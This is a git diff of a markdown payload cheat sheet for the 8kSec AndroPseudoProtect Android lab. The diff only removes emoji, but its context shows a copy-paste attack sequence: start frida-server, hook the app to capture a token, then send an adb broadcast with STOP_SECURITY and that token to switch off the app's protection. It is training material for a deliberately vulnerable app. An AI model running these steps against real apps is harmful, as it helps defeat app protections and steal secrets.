@@ -1,11 +1,11 @@
-# ⚡ Payloads — AndroPseudoProtect (8kSec)
+# Payloads — AndroPseudoProtect (8kSec)
 
 > Quick-reference payload list, in execution order. All commands are copy-paste ready.
 > Full methodology, impact and remediation: `AndroPseudoProtect_Solution.md`
 
 ---
 
-## 0️⃣ Setup
+## 0⃣ Setup
 
 ```bash
 adb devices
@@ -15,7 +15,7 @@ adb shell getprop ro.product.cpu.abi      # x86_64 (VMware VM) / arm64 (physical
 
 ---
 
-## 1️⃣ Start frida-server — Terminal 1 (inside adb shell)
+## 1⃣ Start frida-server — Terminal 1 (inside adb shell)
 
 ```bash
 # Match the client version (frida --version) AND the device architecture
@@ -31,7 +31,7 @@ cd /data/local/tmp
 
 ---
 
-## 2️⃣ Verify the connection — Terminal 2 (host, no adb shell)
+## 2⃣ Verify the connection — Terminal 2 (host, no adb shell)
 
 ```bash
 frida-ps -U           # must list processes before any further step
@@ -39,7 +39,7 @@ frida-ps -U           # must list processes before any further step
 
 ---
 
-## 3️⃣ The Hook — save as `hook_token.js`
+## 3⃣ The Hook — save as `hook_token.js`
 
 ```javascript
 Java.perform(function () {
@@ -77,9 +77,9 @@ frida -U -f com.eightksec.andropseudoprotect -l hook_token.js
 
 ---
 
-## 4️⃣ Attack Payloads
+## 4⃣ Attack Payloads
 
-### 🏁 Primary — stop security from outside the app
+### Primary — stop security from outside the app
 
 ```bash
 adb shell am broadcast \
@@ -127,7 +127,7 @@ sendBroadcast(i);
 
 ---
 
-## 5️⃣ Verification
+## 5⃣ Verification
 
 ```bash
 # Canary file — definitive proof
@@ -146,9 +146,9 @@ adb logcat -d | grep -iE "SecurityNative|eightksec"
 
 ---
 
-## ✅ Final Execution Order
+## Final Execution Order
 
 ```
 adb install → frida-server (T1) → frida-ps -U (T2) → hook + Start Security
-→ copy TOKEN → am broadcast STOP_SECURITY + TOKEN → canary/shared_prefs ✅
+→ copy TOKEN → am broadcast STOP_SECURITY + TOKEN → canary/shared_prefs
 ```
